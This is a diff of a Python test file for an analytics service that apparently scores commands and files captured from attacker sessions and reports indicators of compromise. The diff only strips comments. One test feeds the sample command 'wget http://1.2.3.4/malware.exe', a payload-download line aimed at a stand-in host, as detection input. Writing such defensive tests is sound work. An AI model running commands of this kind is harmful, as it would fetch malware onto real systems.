@@ -17,8 +17,6 @@ async def test_analytics_online_learning_loop_success(base_config):
     service = AnalyticsService(base_config, mock_logger)
     service.ml_pipeline = MagicMock()
     service._fetch_training_data = MagicMock(return_value=["ls", "whoami"])
-
-    # We patch sleep to return once and then raise CancelledError to break the loop
     with patch("asyncio.sleep", side_effect=[None, asyncio.CancelledError()]):
         with pytest.raises(asyncio.CancelledError):
             await service.run_online_learning_loop()
@@ -31,7 +29,6 @@ async def test_analytics_online_learning_loop_success(base_config):
 async def test_analytics_online_learning_loop_error(base_config):
     mock_logger = MagicMock()
     service = AnalyticsService(base_config, mock_logger)
-    # retrain will be called via run_in_executor
     service.ml_pipeline = MagicMock()
     service.ml_pipeline.retrain.side_effect = Exception("retrain fail")
     service._fetch_training_data = MagicMock(return_value=["ls"])
@@ -58,10 +55,8 @@ async def test_analyze_command_exception():
     service.ml_pipeline = MagicMock()
     service.ml_pipeline.analyze_command.side_effect = Exception("pipeline error")
 
-    # This should not crash but log the error (analyze_command offloads to thread)
     service.analyze_command("ls", "1.2.3.4", "test_sess")
 
-    # Wait for the background task to complete
     await asyncio.sleep(0.1)
 
     service.logger.log_event.assert_any_call(
@@ -81,18 +76,14 @@ async def test_analyze_command_success():
         "severity": "high",
     }
 
-    # Signature: analyze_command(self, cmd: str, src_ip: str, session_id: str, ...)
     service.ioc_reporter = MagicMock()
     service.analyze_command("wget http://1.2.3.4/malware.exe", "1.2.3.4", "test_sess")
 
-    # Wait for the background task to complete
     await asyncio.sleep(0.1)
 
-    # Check ml_thought and ml_anomaly logs
     assert any("ml_thought" in str(call) for call in service.logger.log_event.call_args_list)
     assert any("ml_anomaly" in str(call) for call in service.logger.log_event.call_args_list)
 
-    # Check IOC reporter calls
     service.ioc_reporter.add_ioc.assert_any_call(
         "url", "http://1.2.3.4/malware.exe", ANY, "test_sess", severity="high"
     )
@@ -115,9 +106,7 @@ async def test_analyze_file_success():
 
     with patch("hashlib.sha256") as mock_sha:
         mock_sha.return_value.hexdigest.return_value = "fake_hash"
-        # Signature: analyze_file(self, filename: str, content: bytes, session_id: str, src_ip: str)
         service.analyze_file("/tmp/malware", b"malicious data", "test_sess", "1.2.3.4")
 
-    # In analytics.py, it logs "ml_thought" and "ml_file_anomaly"
     assert any("ml_thought" in str(call) for call in service.logger.log_event.call_args_list)
     assert any("ml_file_anomaly" in str(call) for call in service.logger.log_event.call_args_list)
